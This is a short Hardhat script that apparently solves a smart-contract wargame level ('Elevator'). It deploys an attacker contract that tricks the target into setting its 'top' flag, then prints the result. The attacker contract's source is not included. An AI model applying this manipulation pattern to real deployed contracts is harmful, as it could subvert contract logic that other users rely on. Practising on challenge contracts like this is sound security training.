import { ethers } from 'hardhat';

const CONTRACT_ADDRESS = '0xe082b26cEf079a095147F35c9647eC97c2401B83';
const PLAYER_ADDRESS = '0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199';

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);

  const elevator = await ethers.getContractAt(
    'Elevator',
    CONTRACT_ADDRESS,
    signer,
  );

  const RealElevator = await ethers.getContractFactory('DefinatelyABuilding');
  const realElevator = await RealElevator.deploy(CONTRACT_ADDRESS);

  const tx = await realElevator.reachTop();

  console.log('Elevator:', await elevator.top());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
